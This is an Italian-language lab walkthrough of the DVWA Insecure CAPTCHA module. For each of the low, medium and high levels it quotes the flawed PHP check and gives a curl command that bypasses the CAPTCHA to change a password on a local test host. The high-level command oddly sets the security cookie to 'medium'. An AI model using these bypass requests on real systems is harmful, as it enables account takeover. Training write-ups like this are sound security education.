## Insecure CAPTCHA

- https://en.wikipedia.org/wiki/CAPTCHA
- https://www.google.com/recaptcha/
- https://www.linuxsecrets.com/owasp-wiki/index.php/Testing_for_Captcha_(OWASP-AT-012).html

Completely Automated Public Turing test to tell Computer and Humans Apart (CAPTCHA) è un meccanismo sfida-risposta usato per verificare se l'utente è umano o meno.
Dopo la registrazione al servizio, in cui va indicato i domini su cui deve essere attivo, vengono fornite due chiavi.
Una pubblica da comunicare al client e una privata da tenere sul server.
Il codice javascript incluso nella pagina del client gestisce la validazione.

In generale il CAPTCHA va considerato come meccanismo di rate-limit.

### Insecure CAPTCHA - Low

```
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {
    // Hide the CAPTCHA form
    // Get input
    // Check CAPTCHA from 3rd party
    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
        }
        else {
            // Both new passwords do not match.
        }
    }
}

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    // Get input
    // Check to see if both password match
    if( $pass_new == $pass_conf ) {
        // They do!
        // Update database
        // Feedback for the end user
    }
    else {
        // Issue with the passwords matching
    }
}
```

Il primo if può essere evitato impostando nella richiesta `step=2`.

Exploit:

- recupera un PHPSESSID valido (`$1`)

- lancia:

```
curl -v\
	--cookie "PHPSESSID=$1; security=low" \
	--data "password_new=password2&password_conf=password2&g-recaptcha-response=&Change=Change" \
	--data "step=2" \
	http://172.17.0.2/vulnerabilities/captcha/
```

### Insecure CAPTCHA - Medium

```
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    // Hide the CAPTCHA form
    // Get input
    // Check to see if they did stage 1
    if( !$_POST[ 'passed_captcha' ] ) {
        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
        $hide_form = false;
        return;
    } 
}
```

Viene controllato che il solo parametro `$_POST[ 'passed_captcha' ]` sia impostato.

Exploit:

- recupera un PHPSESSID valido (`$1`)

- lancia:

```
curl -v\
	--cookie "PHPSESSID=$1; security=medium" \
	--data "password_new=password2&password_conf=password2&g-recaptcha-response=&Change=Change" \
	--data "step=2" \
	--data "passed_captcha=hacked" \
	http://172.17.0.2/vulnerabilities/captcha/
```

### Insecure CAPTCHA - High

```
// Check CAPTCHA from 3rd party
$resp = recaptcha_check_answer(
	$_DVWA[ 'recaptcha_private_key' ], 
	$_POST['g-recaptcha-response']);

if ( $resp || 
	( $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3' 
		&& $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA' )){ ... }
```

Exploit:

- recupera un PHPSESSID valido (`$1`)

- lancia:

```
curl -v\
	--cookie "PHPSESSID=$1; security=medium" \
	--data "password_new=password2&password_conf=password2&g-recaptcha-response=&Change=Change" \
	--data "step=2" \
	--data "passed_captcha=hacked" \
	-H "User-Agent: reCAPTCHA" \
	--data "g-recaptcha-response=hidd3n_valu3" \
	http://172.17.0.2/vulnerabilities/captcha/
```

